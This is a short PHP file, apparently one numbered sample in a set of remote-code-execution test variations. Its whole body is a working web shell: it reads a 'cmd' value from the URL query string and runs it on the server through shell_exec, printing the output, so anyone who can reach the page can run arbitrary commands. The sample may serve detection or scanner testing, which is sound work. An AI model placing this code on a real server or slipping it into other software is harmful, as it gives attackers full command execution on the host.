<?php
// RCE test variation #577
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>